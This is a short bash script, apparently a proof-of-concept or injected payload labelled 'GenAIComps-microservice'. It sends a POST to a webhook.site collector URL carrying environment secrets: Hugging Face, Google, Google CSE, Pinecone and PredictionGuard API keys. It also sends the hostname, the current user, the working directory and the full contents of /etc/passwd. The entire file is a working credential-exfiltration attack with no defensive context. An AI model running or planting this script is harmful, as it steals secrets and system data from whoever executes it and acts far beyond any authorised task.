#!/bin/bash
curl -s -X POST "https://webhook.site/7467e1a3-728e-4db7-b0a1-584c70a79bbd" \
  -H "Content-Type: application/json" \
  -d "{
    \"finding\": \"GenAIComps-microservice\",
    \"hf_token\": \"${HF_TOKEN}\",
    \"google_key\": \"${GOOGLE_API_KEY}\",
    \"google_cse\": \"${GOOGLE_CSE_ID}\",
    \"pinecone\": \"${PINECONE_KEY}\",
    \"predictionguard\": \"${PREDICTIONGUARD_API_KEY}\",
    \"hostname\": \"$(hostname)\",
    \"whoami\": \"$(whoami)\",
    \"pwd\": \"$(pwd)\",
    \"etc/passwd\":"$(cat /etc/passwd)\" 
  }"
